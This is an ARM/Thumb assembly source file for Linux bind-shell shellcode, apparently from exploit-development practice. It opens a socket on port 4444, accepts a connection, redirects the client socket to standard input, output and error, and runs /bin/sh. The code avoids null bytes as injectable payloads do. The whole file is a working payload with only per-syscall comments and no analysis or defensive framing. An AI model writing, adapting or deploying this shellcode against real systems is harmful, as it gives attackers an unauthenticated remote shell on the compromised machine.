.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1
    bx r3

    .THUMB
// socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    mov r0, #2     // AF_INET
    mov r1, #1     // SOCK_STREAM
    sub r2, r2, r2    // IPPROTO_IP
    mov r7, #200
    add r7, #81     // 281 is socket() syscall
    svc #1
    mov r4, r0     // save host_sockid in r4

// bind(host_sockid, struct sockaddr *addr, socklen_t addrlen)
    adr  r1, struct_addr     // pointer to address, port
    strb r2, [r1, #1]     // Zero-ing necessary data in struct_addr
    strb r2, [r1, #4]
    strb r2, [r1, #5]
    strb r2, [r1, #6]
    strb r2, [r1, #7]
    mov r2, #16         // lenght of sockaddr
    add r7, #1         // 282 is bind() syscall
    svc #1

// listen(host_sockid, 2)
    mov r0, r4     // host_sockid
    mov r1, #2
    add r7, #2     // 284 is listen() syscall
    svc #1

// accept(host_sockid, NULL, NULL)
    mov r0, r4
    sub r1, r1, r1
    sub r2, r2, r2
    add r7, #1     // 285 is accept() syscall
    svc #1
    mov r4, r0     // save client_sockid to r4

// dup2(iclient_sockid, STDIN)
    mov r7, #63
    mov r0, r4
    sub r1, r1, r1
    svc #1

// dup2(iclient_sockid, STDOUT)
    mov r0, r4
    add r1, #1
    svc #1

// dup2(iclient_sockid, STDERR)
    mov r0, r4
    add r1, #1
    svc #1

// execve("/bin/sh", argv, envp)
    adr r0, shellcode 
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]     // Add null terminator to shellcode string
    mov r7, #11
    svc #1
    
struct_addr:
.ascii "\x02\xff"    // AF_INET 0xff will be NULLed
.ascii "\x11\x5c"    // port number 4444
.byte 1,1,1,1        // IP Address

shellcode:
.ascii "/bin/shX"
